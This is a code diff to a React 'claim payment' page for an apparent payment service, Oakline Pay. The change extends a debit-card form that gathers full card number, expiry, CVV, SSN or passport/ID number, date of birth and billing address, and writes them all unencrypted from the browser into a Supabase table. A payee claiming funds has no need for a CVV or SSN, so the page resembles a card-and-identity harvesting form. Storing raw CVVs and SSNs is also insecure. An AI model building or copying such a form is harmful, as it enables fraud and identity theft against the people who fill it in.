@@ -17,19 +17,26 @@ export default function ClaimPaymentPage() {
 
   const [debitCardForm, setDebitCardForm] = useState({
     first_name: '',
+    middle_name: '',
     last_name: '',
     cardholder_name: '',
     card_number: '',
     card_expiry: '',
     card_cvv: '',
+    verification_type: 'ssn',
     ssn: '',
+    id_number: '',
     date_of_birth: '',
+    card_issuer: '',
+    card_issuer_custom: '',
     billing_address: '',
     billing_city: '',
     billing_province_state: '',
     billing_postal_code: '',
     billing_country: ''
   });
+
+  const [verificationType, setVerificationType] = useState('ssn');
 
   const [achForm, setAchForm] = useState({
     account_holder_name: '',
@@ -101,7 +108,10 @@ export default function ClaimPaymentPage() {
   };
 
   const handleDebitCardSubmit = async () => {
-    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_province_state || !debitCardForm.billing_postal_code || !debitCardForm.billing_country) {
+    // Validation: Check verification fields based on type
+    const hasVerification = debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : debitCardForm.id_number;
+
+    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !hasVerification || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_province_state || !debitCardForm.billing_postal_code || !debitCardForm.billing_country || !debitCardForm.card_issuer) {
       setMessage('Please fill in all required fields.', 'error');
       setMessageType('error');
       return;
@@ -109,18 +119,26 @@ export default function ClaimPaymentPage() {
 
     setSubmitting(true);
     try {
-      const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.last_name}`;
+      const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.middle_name ? debitCardForm.middle_name + ' ' : ''}${debitCardForm.last_name}`;
+      const finalCardIssuer = debitCardForm.card_issuer === 'other' ? debitCardForm.card_issuer_custom : debitCardForm.card_issuer;
+      
       const { error } = await supabase
         .from('oakline_pay_pending_claims')
         .update({
           claim_method: 'debit_card',
           claimed_at: new Date().toISOString(),
+          first_name: debitCardForm.first_name,
+          middle_name: debitCardForm.middle_name,
+          last_name: debitCardForm.last_name,
           cardholder_name: finalCardholderName,
           card_number: debitCardForm.card_number,
           card_expiry: debitCardForm.card_expiry,
           card_cvv: debitCardForm.card_cvv,
-          ssn: debitCardForm.ssn,
+          verification_type: debitCardForm.verification_type,
+          ssn: debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : null,
+          id_number: debitCardForm.verification_type === 'id_number' ? debitCardForm.id_number : null,
           date_of_birth: debitCardForm.date_of_birth,
+          card_issuer: finalCardIssuer,
           billing_address: debitCardForm.billing_address,
           billing_city: debitCardForm.billing_city,
           billing_province_state: debitCardForm.billing_province_state,
@@ -541,6 +559,10 @@ export default function ClaimPaymentPage() {
                         <input type="text" placeholder="John" value={debitCardForm.first_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, first_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
                       <div style={{ flex: 1 }}>
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Middle Name <span style={{ color: '#999', fontWeight: '400', fontSize: '0.8rem' }}>Optional</span></label>
+                        <input type="text" placeholder="Michael" value={debitCardForm.middle_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, middle_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                      </div>
+                      <div style={{ flex: 1 }}>
                         <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Last Name *</label>
                         <input type="text" placeholder="Doe" value={debitCardForm.last_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, last_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
@@ -561,7 +583,7 @@ export default function ClaimPaymentPage() {
                       <input type="text" placeholder="1234 5678 9012 3456" maxLength="19" value={debitCardForm.card_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_number: e.target.value.replace(/\D/g, '') })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', letterSpacing: '2px', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                     </div>
 
-                    <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
+                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                       <div style={{ flex: 1 }}>
                         <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Expiry (MM/YY) *</label>
                         <input type="text" placeholder="MM/YY" maxLength="5" value={debitCardForm.card_expiry} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
@@ -571,15 +593,49 @@ export default function ClaimPaymentPage() {
                         <input type="text" placeholder="123" maxLength="4" value={debitCardForm.card_cvv} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
                     </div>
+
+                    <div style={{ marginBottom: '1rem' }}>
+                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer *</label>
+                      <select value={debitCardForm.card_issuer} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'}>
+                        <option value="">Select a card issuer...</option>
+                        <option value="Visa">Visa</option>
+                        <option value="Mastercard">Mastercard</option>
+                        <option value="American Express">American Express</option>
+                        <option value="Discover">Discover</option>
+                        <option value="other">Other / Enter Manually</option>
+                      </select>
+                    </div>
+                    {debitCardForm.card_issuer === 'other' && (
+                      <div style={{ marginBottom: '1rem' }}>
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer Name *</label>
+                        <input type="text" placeholder="e.g., Diners Club, UnionPay, etc." value={debitCardForm.card_issuer_custom} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer_custom: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                      </div>
+                    )}
                   </div>
 
                   <div style={{ marginBottom: '2.5rem' }}>
                     <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Identity Verification</h4>
+                    
+                    <div style={{ marginBottom: '1.5rem' }}>
+                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Verification Type *</label>
+                      <select value={debitCardForm.verification_type} onChange={(e) => setDebitCardForm({ ...debitCardForm, verification_type: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'}>
+                        <option value="ssn">US Social Security Number (SSN)</option>
+                        <option value="id_number">International ID Number (Passport, License, etc.)</option>
+                      </select>
+                    </div>
+
                     <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
-                      <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>SSN *</label>
-                        <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
-                      </div>
+                      {debitCardForm.verification_type === 'ssn' ? (
+                        <div style={{ flex: 1 }}>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Social Security Number *</label>
+                          <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                        </div>
+                      ) : (
+                        <div style={{ flex: 1 }}>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>ID Number *</label>
+                          <input type="text" placeholder="Passport, License, or ID number" value={debitCardForm.id_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, id_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                        </div>
+                      )}
                       <div style={{ flex: 1 }}>
                         <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
                         <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
